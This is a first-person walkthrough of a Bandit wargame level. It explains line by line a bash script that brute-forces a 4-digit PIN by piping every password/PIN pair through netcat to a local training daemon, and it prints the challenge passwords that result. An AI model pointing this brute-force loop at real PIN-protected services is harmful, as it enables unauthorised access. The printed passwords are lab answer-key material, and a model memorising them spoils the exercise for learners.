# Bandit Level 24 → Level 25

## 🎯 Objective

A daemon is listening on port:

```text
30002
```

The challenge states that the daemon will give me the password for **bandit25** if I provide:

1. The current password for **bandit24**
2. A secret **4-digit numeric PIN**

The PIN cannot be retrieved directly.

The only way to find it is to try all possible combinations from:

```text
0000
```

to:

```text
9999
```

This gives a total of:

```text
10,000 possible combinations
```

The challenge also mentions that I **do not need to create a new connection for every attempt**.

Therefore, I can use a single `nc` connection and send all 10,000 password/PIN combinations through it.

## 🗂️ Creating a Temporary Directory

I first created a temporary directory using:

```bash
mktemp -d
```

This creates a uniquely named temporary directory.

I then changed into the newly created directory using:

```bash
cd <temporary-directory>
```

This gave me a clean workspace to create my shell script.

## 📝 Creating the Brute-Force Script

I created a shell script using:

```bash
nano solve.sh
```

I wrote the following script:

```bash
#!/bin/bash

pw="hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv"

for i in {0000..9999}; do
  echo "$pw $i"
done | nc localhost 30002
```

## 🔍 Understanding the Script

### Shebang

```bash
#!/bin/bash
```

This is the **shebang**.

It tells Linux that the script should be executed using the Bash shell.

### Storing the Password

```bash
pw="hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv"
```

I stored the password for **bandit24** in a Bash variable named:

```text
pw
```

This is the password I obtained from the previous level.

The variable can then be accessed using:

```bash
$pw
```

## 🔢 Generating the PIN Combinations

The main part of the script is:

```bash
for i in {0000..9999}; do
```

This creates a Bash `for` loop.

The expression:

```text
{0000..9999}
```

generates every number from:

```text
0000
0001
0002
0003
...
9997
9998
9999
```

The numbers contain four digits because of the leading zeros.

Therefore, the loop runs exactly:

```text
10,000 times
```

The variable:

```text
i
```

contains the current PIN combination.

For example, during the loop it will contain:

```text
0000
```

then:

```text
0001
```

then:

```text
0002
```

and so on until:

```text
9999
```

## 📤 Generating the Password and PIN

Inside the loop, I used:

```bash
echo "$pw $i"
```

For every PIN combination, this prints:

```text
password PIN
```

For example:

```text
hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv 0000
hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv 0001
hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv 0002
```

and eventually:

```text
hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv 9999
```

The space between `$pw` and `$i` is important because the daemon expects the password and PIN separated by a space.

## 🔗 Understanding the Pipe

The following part:

```bash
done | nc localhost 30002
```

uses a **pipe**:

```text
|
```

A pipe takes the output of one command and sends it as the input of another command.

Therefore:

```bash
for i in {0000..9999}; do
  echo "$pw $i"
done
```

generates all the password/PIN combinations.

The pipe then sends all of that output into:

```bash
nc localhost 30002
```

So instead of displaying all 10,000 combinations on the terminal, they are sent directly to the daemon.

## 🌐 Understanding Netcat

The command:

```bash
nc localhost 30002
```

uses **Netcat**, commonly abbreviated as `nc`.

`nc` can establish network connections and send or receive data.

The two arguments are:

```text
localhost
30002
```

### `localhost`

```text
localhost
```

refers to the local machine.

The daemon is running on the same machine, so I connect to:

```text
localhost
```

### Port `30002`

```text
30002
```

is the port on which the Bandit daemon is listening.

Therefore:

```bash
nc localhost 30002
```

means:

```text
Connect to the daemon running locally on port 30002.
```

## 🔗 Why Only One Connection Is Needed

The challenge specifically says:

> You do not need to create new connections each time.

My command takes advantage of this.

The structure is:

```text
10,000 password/PIN combinations
              │
              ▼
             Pipe
              │
              ▼
      nc localhost 30002
              │
              ▼
       One network connection
```

Instead of doing:

```text
Connection → PIN 0000 → Close
Connection → PIN 0001 → Close
Connection → PIN 0002 → Close
...
```

I create one connection:

```text
nc localhost 30002
```

and send all the combinations through that same connection.

This makes the brute-force process much more efficient.

## ▶️ Running the Script

After saving the script, I could make it executable using:

```bash
chmod +x solve.sh
```

Then I could execute it with:

```bash
./solve.sh
```

The script generated all 10,000 combinations and sent them to the daemon.

## 📤 Server Response

The server returned several responses indicating that the password and PIN were incorrect:

```text
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
```

Eventually, one of the combinations was correct.

The server responded:

```text
Correct!
The password of user bandit25 is SoHfqMOEqIX2IYKVciZxvgpR9a2Djx4P
```

This confirmed that the correct PIN had been found.

## 🔑 Password

The password for **bandit25** is:

```text
SoHfqMOEqIX2IYKVciZxvgpR9a2Djx4P
```

## 🧠 What I Learned

* A **daemon** is a background process that can provide services to other programs.
* Network services can listen for connections on specific **ports**.
* `nc` (Netcat) can be used to communicate with network services.
* `localhost` refers to the local machine.
* A port number identifies a specific network service.
* Bash `for` loops can automate repetitive tasks.
* `{0000..9999}` generates all 10,000 possible four-digit PIN combinations.
* Leading zeros are important because the PIN must contain exactly four digits.
* A Bash variable can be created using:

  ```bash
  variable="value"
  ```
* Variables can be accessed using:

  ```bash
  $variable
  ```
* The `|` operator is called a **pipe** and sends the output of one command into another command.
* Instead of opening a separate connection for every PIN, all combinations can be sent through a single Netcat connection.
* Brute-forcing means systematically trying all possible combinations until the correct one is found.

---

## 📌 Key Takeaway

The main idea of this level was to automate the process of trying all possible PIN combinations.

The complete process was:

```text
Password for bandit24
        │
        ▼
Generate PINs from 0000 → 9999
        │
        ▼
Combine password + PIN
        │
        ▼
Pipe all combinations into Netcat
        │
        ▼
nc localhost 30002
        │
        ▼
Daemon checks each combination
        │
        ▼
Correct combination found
        │
        ▼
Password for bandit25
```

The important script was:

```bash
#!/bin/bash

pw="hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv"

for i in {0000..9999}; do
  echo "$pw $i"
done | nc localhost 30002
```

The password I obtained for **Level 25** was:

```text
SoHfqMOEqIX2IYKVciZxvgpR9a2Djx4P
```